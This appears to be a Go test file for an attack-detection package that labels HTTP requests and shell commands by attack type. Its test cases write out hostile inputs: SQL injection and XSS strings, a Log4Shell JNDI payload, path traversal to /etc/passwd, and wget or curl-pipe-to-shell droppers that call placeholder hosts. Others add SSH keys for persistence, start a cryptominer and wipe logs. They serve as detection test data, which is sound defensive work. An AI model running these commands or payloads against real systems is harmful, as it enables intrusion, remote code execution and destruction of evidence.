package detect

import (
	"slices"
	"testing"
)

func TestHTTP(t *testing.T) {
	cases := []struct {
		method, uri, body, ua string
		want                  []string
	}{
		{"GET", "/index.php?id=1%27%20UNION%20SELECT%201,2--", "", "", []string{"sqli"}},
		{"GET", "/?id=1' or '1'='1", "", "", []string{"sqli"}},
		{"GET", "/search?q=%253Cscript%253E", "", "", []string{"xss"}}, // double-encoded
		{"GET", "/../../../../etc/passwd", "", "", []string{"path_traversal"}},
		{"GET", "/shell?cd+/tmp;wget+http://x/jaws;sh+jaws", "", "", []string{"cmd_injection", "iot_exploit"}},
		{"GET", "/", "", "${jndi:ldap://x/a}", []string{"log4shell"}},
		{"GET", "/.git/config", "", "Go-http-client/1.1", []string{"scanner", "secrets_probe"}},
		{"POST", "/xmlrpc.php", "<methodCall>", "", []string{"wordpress"}},
		{"PROPFIND", "/", "", "", []string{"unusual_method"}},
		{"GET", "/about", "", "Mozilla/5.0 (Windows NT 10.0)", nil},
	}
	for _, c := range cases {
		got := HTTP(c.method, c.uri, c.body, c.ua)
		if !slices.Equal(got, c.want) {
			t.Errorf("%s %s ua=%q: got %v, want %v", c.method, c.uri, c.ua, got, c.want)
		}
	}
}

func TestCommand(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		{"uname -a", []string{"recon"}},
		{"cat /proc/cpuinfo | grep name | wc -l", []string{"recon"}},
		{"cd /tmp; wget http://x/a.sh; chmod +x a.sh; sh a.sh", []string{"download", "execution"}},
		{"echo ssh-rsa AAA >> ~/.ssh/authorized_keys", []string{"persistence"}},
		{"./xmrig -o stratum+tcp://pool:3333", []string{"cryptominer", "execution"}},
		{"history -c; rm -rf /var/log/*", []string{"defense_evasion"}},
		{"/bin/busybox ECCHI", []string{"botnet"}},
		{"ls", nil},
	}
	for _, c := range cases {
		if got := Command(c.line); !slices.Equal(got, c.want) {
			t.Errorf("%q: got %v, want %v", c.line, got, c.want)
		}
	}
}

func TestURLs(t *testing.T) {
	got := URLs("cd /tmp; wget http://198.51.100.1/x86;curl -O https://203.0.113.2/a.sh|sh")
	want := []string{"http://198.51.100.1/x86", "https://203.0.113.2/a.sh"}
	if !slices.Equal(got, want) {
		t.Errorf("got %v", got)
	}
}

func TestTruncate(t *testing.T) {
	if got := Truncate("привет", 5); got != "пр…" {
		t.Errorf("got %q", got)
	}
	if got := Truncate("abc", 5); got != "abc" {
		t.Errorf("got %q", got)
	}
}
